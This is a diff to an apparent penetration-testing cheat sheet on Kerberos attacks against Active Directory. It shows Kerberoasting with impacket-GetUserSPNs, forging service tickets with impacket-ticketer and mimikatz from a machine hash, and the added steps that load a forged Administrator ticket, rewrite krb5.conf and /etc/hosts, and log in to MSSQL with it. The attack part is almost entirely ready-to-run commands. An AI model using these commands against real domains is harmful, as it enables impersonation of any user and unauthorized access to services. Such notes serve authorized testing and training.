@@ -34,6 +34,10 @@ Linux (Add -request to Kerberoast if needed)
 
     impacket-GetUserSPNs domain.local/user.name:Spring2023 -dc-ip IP
 
+### 4) Kerberos modules installed on your machine
+
+    sudo apt install krb5user
+
 ## Steps:
 
 ### 1) Create ST
@@ -64,3 +68,26 @@ MISC
     impacket-ticketer -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER
 
     mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"
+
+### 2) After crafting your ST, export the ccache file into krb5ccname
+
+    export KRB5CCNAME=Administrator.ccache
+
+### 3) Adjust the krb5.conf by adding the target domain and realm by adding them as new entries with the corresponding format
+
+    [realms]
+        DOMAIN.LOCAL = {
+        kdc = domain.domain.local
+        }
+
+    [domain_realm]
+        .domain.local = DOMAIN.LOCAL
+
+#### TIP: If you have access to a service (MSSQL, for example) via port forward, DO NOT FORGET to set an extra /etc/hosts file entry with localhost
+
+    #192.168.1.45 domain.local    domain.domain.local
+    127.0.0.1    domain.local    domain.domain.local
+
+### 4) Authenticate with your crafted Silver Ticket
+
+    impacket-mssql -k domain.domain.local
